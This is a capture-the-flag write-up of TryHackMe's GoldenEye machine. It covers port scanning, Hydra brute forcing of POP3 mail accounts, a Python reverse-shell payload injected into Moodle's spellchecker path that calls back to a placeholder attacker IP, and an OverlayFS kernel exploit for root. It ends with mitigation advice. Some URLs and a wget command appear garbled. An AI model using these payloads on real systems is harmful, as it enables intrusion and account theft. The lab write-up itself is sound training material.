<img width="1227" height="860" alt="Screenshot 2026-05-26 182716" src="https://github.com/user-attachments/assets/246dc6bc-8615-4439-a6f8-655de3aac531" />
<img width="1227" height="860" alt="Screenshot 2026-05-26 182716" src="https://github.com/user-attachments/assets/8c87a0cd-05e8-48a5-918b-2a02e334661e" />
# TryHackMe: GoldenEye CTF Write-Up
* **Difficulty:** Medium
* **Target IP:** `10.112.182.182`

---

## 🗺️ Phase 1: Reconnaissance & Enumeration (Task 1)

### Nmap Scan
To initiate the engagement, a comprehensive port scan was conducted using `nmap` to discover active services and operational software versions:

```bash
nmap -sCV 10.112.182.182
```

The scan revealed **4 open ports**:

```text
PORT      STATE SERVICE VERSION
25/tcp    open  smtp    Postfix smtpd
80/tcp    open  http    Apache httpd 2.4.7 ((Ubuntu))

|_http-title: GoldenEye Primary Admin Server
55006/tcp open  unknown
55007/tcp open  unknown
```

### Protocol Analysis
* **SMTP (Port 25):** Simple Mail Transfer Protocol, used for routing and transferring emails.
* **HTTP (Port 80):** A standard unencrypted web server running a legacy Apache version on Ubuntu.
* **Ports 55006/55007 (Unknown):** High-range custom ports. Banner grabbing via Netcat (`nc 10.112.182.182 55007`) revealed a `+OK Dovecot ready` banner, indicating an active **POP3 email service**.

### Web Content Inspection
Inspecting the source code of the web page running on port 80 revealed a non-standard JavaScript file named `terminal.js`. Inside, a developer comment addressed to **Boris** leaked a default, plaintext credential string:

* **User:** `boris`
* **Default Password:** `InvincibleHack3r`

Navigating to the disclosed hidden directory `http://10.112.182` confirmed the validity of these credentials for initial entry.

---

## ✉️ Phase 2: Email Exploitation & User Pivoting (Task 2)

### POP3 Brute Forcing with Hydra
The initial credentials did not work on the newly discovered POP3 email server, implying the user updated their password. To bypass this, **THC-Hydra** was utilized to execute an automated dictionary attack against the custom POP3 port (`55007`) using the `rockyou.txt` wordlist.

```bash
hydra -l boris -P /usr/share/wordlists/rockyou.txt 10.112.182.182 pop3 -s 55007 -t 1
```
*(Note: `-t 1` was specified to restrict parallel tasks and prevent the legacy Dovecot server from dropping connections due to inactivity/saturation).*

**Result:** A valid credential pair was recovered:
* **Username:** `boris`
* **Password:** `secret1!`

### Email Data Exfiltration
Using `telnet`, a direct session was established with the mail server to read internal communications:

```bash
telnet 10.112.182.182 55007
USER boris
PASS secret1!
STAT
RETR 1
```

Reading Boris's inbox revealed the existence of additional system users: `natalya` and `alec`. Repeating the Hydra dictionary attack strategy against the `natalya` account successfully cracked her credentials:

* **Username:** `natalya`
* **Password:** `bird`

Logging into Natalya's POP3 inbox uncovered a high-value email exposing a hidden enterprise domain path and an internal contractor profile:

```text
Username: xenia
Password: RCP90rulez!
Internal Domain URL: ://severnaya-station.com
```

---

## 🌐 Phase 3: Web Exploitation & Reverse Shell

### Local DNS Configuration
The internal URL `severnaya-station.com` failed to resolve via public DNS. To fix this network routing restriction, the local `/etc/hosts` file on the attacking machine was modified to map the domain name straight to the target server's IP address:

```text
10.112.182.182  severnaya-station.com
```

### Moodle Access & Image Steganography
Navigating to `http://://severnaya-station.com` displayed a legacy **Moodle CMS** portal. Logging in as `xenia` led to an internal forum thread where a user profile file named `s3cret.txt` was discovered. The text pointed to a hidden image location: `/dir007key/for-007.jpg`.

The image was downloaded locally to analyze its metadata structure:
```bash
wget http://severnaya-station.com
exiftool for-007.jpg
```

The metadata dump exposed a Base64 encoded string hidden inside the `Image Description` field: `eFdpbnRlcjE5OTV4IQ==`. Decoding it revealed the portal's master administrative credentials:

```bash
echo -n "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# Output: xWinter1995x!
```

* **Master Username:** `admin`
* **Master Password:** `xWinter1995x!`

### Command Injection via TinyMCE Spellchecker
Authenticating as the `admin` user granted full management rights over Moodle's configuration modules. A code execution vector was identified within the TinyMCE HTML editor settings:

1. Navigated to **Site Administration** $\rightarrow$ **Plugins** $\rightarrow$ **Text Filters** $\rightarrow$ **Manage Filters**.
2. Adjusted the **Spell Engine** setting from *Google Spell* to **`PSpellShell`**.
3. Injected a standalone, uncompiled Python reverse shell execution payload straight into the **Path to aspell** (`aspellpath`) configuration block:

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_KALI_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

After starting a local Netcat listener (`nc -lvnp 4444`) on the host system, creating a new blog post entry and clicking the **ABC (Check Spelling)** icon immediately triggered the exploit payload on the server.

---

## ⚡ Phase 4: Local Privilege Escalation (Root)

### System Enumeration
The active terminal context landed as the low-privilege `www-data` user account. System level enumeration was executed to analyze the kernel patch layout:

```bash
www-data@ubuntu:/$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP x86_64 GNU/Linux
```

### OverlayFS Kernel Exploitation
The operational kernel build (`3.13.0-32-generic`) is highly vulnerable to a historic local privilege escalation exploit involving incorrect permission handling within the **OverlayFS** filesystem structure (**CVE-2015-1328** / `ofs.c`).

Because compiler packages were heavily restricted on the host, the exploit was modified to use the basic native compiler compiler string tool (`cc`) instead of `gcc`:

```bash
cd /tmp
sed -i "s/gcc/cc/g" ofs.c
cc ofs.c -o local_root -ldl -w
chmod +x local_root
./local_root
```

The binary manipulated the local system configuration paths, safely spawned an unrestricted execution thread environment, and dropped the terminal prompt directly into full root authority.

```bash
whoami
# Output: root
```

### Loot & Flag Collection
With complete access achieved, both target validation tokens were easily read from the disk files system:

* **User Flag:** `cat /home/natalya/user.txt`
* **Root Flag:** `cat /root/root.txt`

---
## 🏆 Key Takeaways & Mitigation Defensive Controls
1. **Enforce Password Complexity Policies:** Default credentials like `InvincibleHack3r` should be systematically expired upon initial setup, and legacy dictionary passwords like `bird` or `secret1!` must be banned.
2. **Sanitize Configuration Inputs:** Web applications should implement strict regex validation filters on binary execution path configurations (like `aspellpath`) to prevent path traversal and arbitrary command concatenation.
3. **Continuous Kernel Patch Management:** Implement automated OS upgrade pipelines to mitigate old, known local kernel escalation flaws like OverlayFS.


<img width="1227" height="860" alt="Screenshot 2026-05-26 182716" src="https://github.com/user-attachments/assets/f1eddd0d-4992-4fa5-9dde-e015c7d30082" />
